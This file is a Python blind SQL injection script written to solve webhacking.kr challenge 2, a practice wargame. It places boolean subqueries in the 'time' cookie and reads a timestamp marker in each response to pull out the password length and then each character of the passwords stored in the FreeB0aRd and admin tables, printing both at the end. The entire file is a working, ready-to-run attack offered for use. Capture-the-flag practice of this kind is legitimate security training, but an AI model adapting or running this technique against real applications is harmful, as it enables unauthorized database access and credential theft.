# Code by rootnix ( rootnix.in ) @ 2014-06-17

import re, urllib#, urllib2
import urllib.request
password=""
leng=0
SESSION = "kbpcni8p6147onihbtpmavj3i3"

print ("-----------------------------------------------")
print ("  Blind SQL Injection Script FOR Challenge 2")
print (" Script by rootnix@PwnPlay / http://rootnix.in")
print (" Modify for Python3. by mae4520")
print ("-----------------------------------------------")

for j in range(1,100):
    url="http://webhacking.kr/challenge/web/web-02/"
    #req=urllib2.Request(url)
    #req=urllib.request.urlopen(url)
    #req.add_header('Cookie',"time=1402367082 and (select length(password) from FreeB0aRd)=%d; PHPSESSID=%s" %(j,SESSION))
    #read=urllib2.urlopen(req).read()
    req=urllib.request.Request(url)
    req.add_header('Cookie',"time=1402367082 and (select length(password) from FreeB0aRd)=%d; PHPSESSID=%s" %(j,SESSION))
    #read=urllib.request.urlopen(req).read()
    #with urllib.request.urlopen(req) as response:
    #    read = response.read()
    read=urllib.request.urlopen(req).read()
    #print(read)
    findrows = re.compile(b'2070-01-01 09:00:01')
    ok = re.findall(findrows,read)

    if ok:
      print ("Length Of FreeB0aRd Password: %d"% j )
      leng = j
      break

for j in range(1,leng+1):
   print ("%d/%d Progress..." %(j,leng))
   for i in range(33,126):
       url="http://webhacking.kr/challenge/web/web-02/"
       #req=urllib2.Request(url)
       req=urllib.request.Request(url)
       req.add_header('Cookie',"time=1337906400 and (select ascii(substring(password,%d,1)) from FreeB0aRd)=%d; PHPSESSID=%s" %(j,i,SESSION))
       #read=urllib2.urlopen(req).read()
       read=urllib.request.urlopen(req).read()
       findrows=re.compile(b'<!--2070-01-01 09:00:01--></td>')
       ok = re.findall(findrows,read)
       if ok:
           password=password+chr(i)
           print ("Now Password:"+password)
           break

print ("FreeBoard Password is %s" %(password))
baordpass = password

password = ''
for j in range(1,100):
    url="http://webhacking.kr/challenge/web/web-02/"
    #req=urllib2.Request(url)
    req=urllib.request.Request(url)
    req.add_header('Cookie',"time=1402367082 and (select length(password) from admin)=%d; PHPSESSID=%s" %(j,SESSION))
    #read=urllib2.urlopen(req).read()
    read=urllib.request.urlopen(req).read()
    findrows=re.compile(b'2070-01-01 09:00:01')
    ok = re.findall(findrows,read)

    if ok:
      print ("Length Of FreeB0aRd Password: %d" %j)
      leng = j
      break

for j in range(1,leng+1):
  print ("%d/%d Progress..." %(j,leng-1))
  for i in range(33,126):
       url="http://webhacking.kr/challenge/web/web-02/"
       #req=urllib2.Request(url)
       req=urllib.request.Request(url)
       req.add_header('Cookie',"time=1402367082 and (select ascii(substring(password,%d,1)) from admin)=%d; PHPSESSID=%s" %(j,i,SESSION))
       #read=urllib2.urlopen(req).read()
       read=urllib.request.urlopen(req).read()
       findrows=re.compile(b'2070-01-01 09:00:01')
       ok = re.findall(findrows,read)
       if ok:
           password=password+chr(i)
           print ("Now Password:"+password)
           break

print ("admin Password is %s" %(password))


print ("---------------------------------------------")
print ("                   RESULT")
print ("   ADMIN   PASSWORD : %s" %(password))
print (" FREEBoard PASSWORD : %s" %(baordpass))
print ("")
print ("---------------------------------------------")
